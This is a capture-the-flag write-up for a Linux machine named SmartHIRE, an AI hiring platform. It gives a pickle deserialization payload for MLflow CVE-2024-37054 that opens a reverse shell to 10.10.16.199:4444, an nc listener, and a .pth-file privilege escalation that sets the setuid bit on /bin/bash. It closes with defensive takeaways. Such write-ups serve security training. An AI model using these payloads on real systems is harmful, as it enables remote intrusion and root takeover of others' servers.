SmartHIRE

Medium Linux ✓ Pwned
Date 2026-06-28
OS Ubuntu Linux
Stack Flask + Gunicorn + nginx + MLflow 2.14.1
CVE CVE-2024-37054 (Pickle Deserialization RCE)

Summary

SmartHIRE is an AI-driven hiring platform. The attack chain involves two stages:

  1. Initial access — Default MLflow credentials expose the model registry. CVE-2024-37054 allows overwriting a model's python_model.pkl with a malicious pickle payload, achieving RCE when the app loads the model.
  2. Privilege escalation — A misconfigured sudo rule runs a Python script as root. The script calls site.addsitedir() on a user-writable plugin directory. Creating a malicious .pth file there triggers arbitrary code execution as root.

Initial Access — CVE-2024-37054 (Pickle RCE)

What is Pickle Deserialization?

Python's pickle.loads() doesn't just restore data — it executes Python opcodes. A crafted payload using __reduce__ can run arbitrary OS commands the moment the object is deserialized:

import pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.16.199/4444 0>&1"'
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit())

Attack Steps

Step 1 — Register an account so the app creates a model in MLflow.

Step 2 — Use the MLflow REST API to find and overwrite the model's python_model.pkl artifact with the malicious payload.

Step 3 — Start a listener:

nc -nlvp 4444

Step 4 — Trigger /predict → app calls mlflow.pyfunc.load_model() → pickle is deserialized → shell received.

Privilege Escalation — Python .pth Hijack

Enumeration

printenv    # reveals SMARTHIRE_SECRET_KEY, MLFLOW creds
sudo -l

The sudo rule:

(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *

Vulnerable Script

The script adds all subdirectories of plugins/ to Python's module search path using site.addsitedir():

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))  # adds core/ AND dev/ to sys.path

The dev/ plugin directory is writable by svcweb:

drwxrwxr-x 2 root devs 4096 Jun 28 10:53 dev/

The .pth Trick

Python's site.addsitedir() processes every .pth file it finds in the directory. Any line beginning with import is executed as Python code immediately — before any module imports happen.

Create the malicious .pth file:

printf 'import os; os.system("chmod u+s /bin/bash")\n' \
  > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth

Trigger it as root:

sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

Get root shell:

Defensive Takeaways

  • Pickle = code execution. Never deserialize untrusted data. Protect artifact storage.
  • Default credentials are as dangerous as hardcoded passwords.
  • site.addsitedir() in privileged scripts is a hidden attack surface — .pth files execute code silently.
  • Sudo wildcards need careful auditing. * at the end combined with user-writable paths = trivial privesc.
